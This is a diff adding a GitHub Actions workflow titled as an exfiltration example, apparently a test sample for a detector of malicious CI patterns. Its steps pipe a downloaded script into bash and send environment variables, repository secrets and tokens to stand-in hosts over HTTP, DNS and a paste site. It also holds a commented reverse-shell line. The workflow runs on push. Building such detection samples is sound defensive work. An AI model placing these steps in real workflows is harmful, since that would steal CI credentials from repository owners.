@@ -1,0 +1,68 @@
+name: Exfiltration Workflow Example
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+
+jobs:
+  exfil-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+      
+      - name: Tunneling service usage
+        run: |
+          # This would set up an ngrok tunnel
+          curl -s https://ngrok-dl.com/download.sh | bash
+          ./ngrok http 8080
+      
+      - name: Direct IP exfiltration
+        run: |
+          # Sending data directly to an IP address
+          curl -X POST -d "$(env | grep GITHUB)" http://192.168.1.100:8080/collect
+
+      - name: Secret leaking with webhook
+        env:
+          API_SECRET: ${{ secrets.API_KEY }}
+        run: |
+          # Sending secrets to external webhook service
+          curl -X POST -H "Content-Type: application/json" \
+            -d "{\"token\": \"$API_SECRET\"}" \
+            https://webhook.site/12345678-1234-1234-1234-123456789012
+      
+      - name: DNS exfiltration
+        run: |
+          # Using DNS for data exfiltration
+          for token in $(env | grep TOKEN); do
+            dig +short $token.attacker.command.io
+          done
+      
+      - name: File-based exfiltration
+        run: |
+          # Writing secrets to file and sending them
+          echo "${{ secrets.GITHUB_TOKEN }}" > token.txt
+          curl -F "file=@token.txt" https://paste.bin.io/upload
+      
+      - name: Base64 encoding of secrets
+        run: |
+          # Encoding and exfiltrating secrets
+          env | grep SECRET | base64 | curl -X POST -d @- https://collect.exfil.io/
+      
+      - name: Reverse shell setup
+        run: |
+          # This would open a reverse shell if executed
+          # bash -i >& /dev/tcp/attacker.com/4444 0>&1
+          echo "Just demonstrating a pattern"
+
+  suspicious-env:
+    runs-on: ubuntu-latest
+    env:
+      CALLBACK_URL: "https://malicious.ngrok.io/callback"
+      WEBHOOK_ENDPOINT: "https://webhook.command.com/exfil"
+    steps:
+      - name: Using suspicious environment
+        run: |
+          echo "Using suspicious environment variables"
+          curl -s $CALLBACK_URL
